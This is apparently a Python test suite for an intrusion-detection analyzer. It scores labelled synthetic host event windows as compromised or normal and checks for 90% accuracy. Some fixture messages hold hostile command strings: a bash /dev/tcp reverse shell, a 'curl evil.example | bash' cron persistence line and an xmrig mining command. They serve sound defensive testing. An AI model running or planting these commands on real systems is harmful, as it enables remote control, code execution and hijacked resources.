"""入侵判定准确率。

口径：每个用例是一台主机的一个时间窗，标签只有「失陷 / 正常」。
准确率 = 判对的用例数 / 用例总数。目标 >= 90%。

正样本覆盖常见入侵链，负样本覆盖最容易误报的正常运维，
避免只在攻击样本上把分数刷高。
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

from irtrace.analyzers.intrusion import judge_intrusion
from irtrace.core.models import Category, Event


def _ev(action: str, *, minutes: int = 0, **kwargs) -> Event:
    base = datetime(2026, 10, 12, 8, 0, tzinfo=timezone.utc)
    kwargs.setdefault("category", Category.AUTH)
    kwargs.setdefault("source", "bench")
    kwargs.setdefault("message", action)
    return Event(action=action, timestamp=base + timedelta(minutes=minutes), **kwargs)


# (名称, 是否失陷, 事件列表)
CASES = []


def case(name: str, compromised: bool, events: list) -> None:
    CASES.append((name, compromised, events))


# --- 失陷：应当判中 ---
def _bruteforce_then_login():
    events = [
        _ev("ssh_failed", minutes=i, src_ip="203.0.113.9", user="root",
            category=Category.AUTH, tags=["auth-failure"])
        for i in range(8)
    ]
    events.append(_ev(
        "ssh_login", minutes=12, src_ip="203.0.113.9", user="root",
        category=Category.AUTH, tags=["auth-success"],
    ))
    return events


case("爆破后登录成功", True, _bruteforce_then_login())

case("爆破成功后立刻 sudo", True, _bruteforce_then_login() + [
    _ev("sudo", minutes=16, user="root", category=Category.ACCOUNT,
        tags=["privilege-escalation"], message="COMMAND=/usr/bin/useradd backup"),
])

case("可写目录落地并执行挖矿", True, [
    _ev("suspicious_file", minutes=1, category=Category.FILE,
        path="/tmp/.cache/xmrig", tags=["suspicious-file", "known_malware_name"],
        message="可疑文件 xmrig"),
    _ev("process_suspicious", minutes=2, category=Category.PROCESS,
        path="/tmp/.cache/xmrig", pid=4242, user="root",
        tags=["suspicious-process", "known_malware_name"],
        message="xmrig -o stratum+tcp://pool.example:3333"),
])

case("反弹 shell 加外联", True, [
    _ev("process_suspicious", minutes=1, category=Category.PROCESS,
        path="/bin/bash", pid=77, user="www-data",
        tags=["suspicious-process", "reverse_shell_pattern"],
        message="bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"),
    _ev("external_connection", minutes=2, category=Category.NETWORK,
        dst_ip="203.0.113.50", dst_port=4444,
        tags=["external-conn", "suspicious_port", "reverse_shell_pattern"],
        message="外联 203.0.113.50:4444"),
])

case("已删除可执行文件加 rootkit 模块", True, [
    _ev("process_suspicious", minutes=1, category=Category.PROCESS,
        path="/usr/bin/sshd (deleted)", pid=9, user="root",
        tags=["suspicious-process", "exe_deleted"]),
    _ev("rootkit_module", minutes=2, category=Category.KERNEL,
        tags=["rootkit", "critical"], message="diamorphine"),
])

case("登录后写入反弹 cron", True, _bruteforce_then_login() + [
    _ev("suspicious_persistence", minutes=20, category=Category.PERSISTENCE,
        path="/etc/cron.d/update",
        tags=["cron-persistence", "suspicious-content"],
        message="curl http://evil.example/p.sh | bash"),
])

case("情报判定恶意 IP 的外联配合落地", True, [
    _ev("suspicious_file", minutes=1, category=Category.FILE,
        path="/dev/shm/.x", tags=["suspicious-file"]),
    _ev("process_suspicious", minutes=2, category=Category.PROCESS,
        path="/dev/shm/.x", tags=["suspicious-process"]),
    _ev("external_connection", minutes=3, category=Category.NETWORK,
        dst_ip="45.155.205.233", dst_port=443,
        tags=["external-conn"],
        message="威胁情报判定恶意 IP: 45.155.205.233"),
])

case("爆破未成功但随后出现 webshell 落地", True, [
    _ev("ssh_failed", minutes=i, src_ip="198.51.100.7", user="admin",
        tags=["auth-failure"])
    for i in range(12)
] + [
    _ev("suspicious_file", minutes=30, category=Category.FILE,
        path="/tmp/shell.py", tags=["suspicious-file"]),
    _ev("process_suspicious", minutes=31, category=Category.PROCESS,
        path="/tmp/shell.py", tags=["suspicious-process", "reverse_shell_pattern"],
        message="python -c socket connect"),
])

case("uid0 后门账号加可疑 systemd", True, [
    _ev("uid0_account", minutes=1, category=Category.ACCOUNT, user="toor",
        tags=["backdoor-account", "critical"], message="UID=0 非 root"),
    _ev("suspicious_persistence", minutes=2, category=Category.PERSISTENCE,
        path="/etc/systemd/system/update.service",
        tags=["systemd-persistence", "suspicious-content"],
        message="ExecStart=/tmp/.cache/xmrig"),
])

case("无文件进程加未知内核模块", True, [
    _ev("process_suspicious", minutes=1, category=Category.PROCESS,
        path="/usr/sbin/kworker (deleted)", tags=["suspicious-process", "exe_deleted"]),
    _ev("unknown_module", minutes=2, category=Category.KERNEL,
        tags=["kernel-module"], message="hide_mod"),
])

# --- 正常：不应当判失陷 ---
case("管理员日常 sudo", False, [
    _ev("ssh_login", minutes=1, src_ip="10.0.0.8", user="alice",
        tags=["auth-success"]),
    _ev("sudo", minutes=3, user="alice", category=Category.ACCOUNT,
        tags=["privilege-escalation"], message="COMMAND=/usr/bin/apt update"),
])

case("一次输错密码后登录", False, [
    _ev("ssh_failed", minutes=1, src_ip="10.1.0.4", user="bob", tags=["auth-failure"]),
    _ev("ssh_login", minutes=2, src_ip="10.1.0.4", user="bob", tags=["auth-success"]),
])

case("合法软件外联 443", False, [
    _ev("external_connection", minutes=1, category=Category.NETWORK,
        dst_ip="93.184.216.34", dst_port=443, tags=["external-conn"],
        message="外联 example.com:443 进程=apt"),
])

case("仅有运维公钥", False, [
    _ev("ssh_authorized_key", minutes=1, category=Category.PERSISTENCE,
        path="/home/alice/.ssh/authorized_keys",
        tags=["ssh-key", "persistence"], message="1 个 SSH 公钥"),
])

case("特权组成员基线", False, [
    _ev("privileged_group_members", minutes=1, category=Category.ACCOUNT,
        tags=["privileged-group"], message="sudo 组成员: alice"),
])

case("系统更新进程不是恶意", False, [
    _ev("process_suspicious", minutes=1, category=Category.PROCESS,
        path="/usr/bin/unattended-upgrade",
        tags=["baseline-deviation"], message="unattended-upgrade"),
])

case("爆破失败且没有后续", False, [
    _ev("ssh_failed", minutes=i, src_ip="203.0.113.50", user="root",
        tags=["auth-failure"])
    for i in range(6)
])

case("未知内核模块但无其它痕迹", False, [
    _ev("unknown_module", minutes=1, category=Category.KERNEL,
        tags=["kernel-module"], message="vendor_foo"),
])

case("登录后半小时内没有提权落地", False, [
    _ev("ssh_login", minutes=1, src_ip="10.2.0.9", user="carol",
        tags=["auth-success"]),
    _ev("session_active", minutes=2, user="carol", tags=["active-session"]),
])

case("可写目录有文件但没有执行", False, [
    _ev("suspicious_file", minutes=1, category=Category.FILE,
        path="/tmp/notes.txt", tags=["suspicious-file"], message="近期变更"),
])


def test_suid_in_writable_dir_is_compromise():
    verdict = judge_intrusion([
        _ev("suid_in_writable", minutes=1, category=Category.FILE,
            path="/tmp/.suid", tags=["suid", "critical"]),
    ])
    assert verdict.compromised


def test_ld_preload_is_compromise():
    verdict = judge_intrusion([
        _ev("ld_preload", minutes=1, category=Category.KERNEL,
            path="/etc/ld.so.preload", tags=["rootkit", "critical"],
            message="/etc/ld.so.preload 存在内容"),
    ])
    assert verdict.compromised


def test_home_in_tmp_is_compromise():
    verdict = judge_intrusion([
        _ev("suspicious_home", minutes=1, category=Category.ACCOUNT,
            user="backdoor", tags=["suspicious-home"],
            message="家目录 /tmp/backdoor"),
    ])
    assert verdict.compromised


def test_listen_alone_is_not_compromise():
    verdict = judge_intrusion([
        _ev("suspicious_listen", minutes=1, category=Category.NETWORK,
            dst_port=4444, tags=["suspicious-listen"]),
    ])
    assert not verdict.compromised


def test_baseline_deviations_are_not_compromise():
    verdict = judge_intrusion([
        _ev("system_account_login_shell", minutes=1, category=Category.ACCOUNT,
            user="daemon", tags=["baseline-deviation"]),
        _ev("password_changed", minutes=2, category=Category.ACCOUNT,
            user="alice", tags=["password-change"]),
        _ev("privileged_group_members", minutes=3, category=Category.ACCOUNT,
            tags=["privileged-group"]),
        _ev("sysctl_deviation", minutes=4, category=Category.KERNEL,
            tags=["sysctl", "baseline-deviation"]),
    ])
    assert not verdict.compromised


def test_cases_cover_both_classes():
    labels = {compromised for _, compromised, _ in CASES}
    assert labels == {True, False}
    assert sum(1 for _, compromised, _ in CASES if compromised) >= 8
    assert sum(1 for _, compromised, _ in CASES if not compromised) >= 8


def test_intrusion_accuracy_at_least_90_percent():
    wrong = []
    for name, expected, events in CASES:
        verdict = judge_intrusion(events)
        if verdict.compromised != expected:
            wrong.append(
                f"{name}: 期望 {'失陷' if expected else '正常'}，"
                f"得到 score={verdict.score} signals={verdict.signals} "
                f"suppress={verdict.suppressors}"
            )
    accuracy = (len(CASES) - len(wrong)) / len(CASES)
    assert accuracy >= 0.90, (
        f"准确率 {accuracy:.1%}（{len(CASES) - len(wrong)}/{len(CASES)}），"
        f"未达标:\n" + "\n".join(wrong)
    )


def test_each_case_is_deterministic():
    for name, expected, events in CASES:
        first = judge_intrusion(events)
        second = judge_intrusion(events)
        assert first.compromised == second.compromised == expected, name
        assert first.score == second.score, name
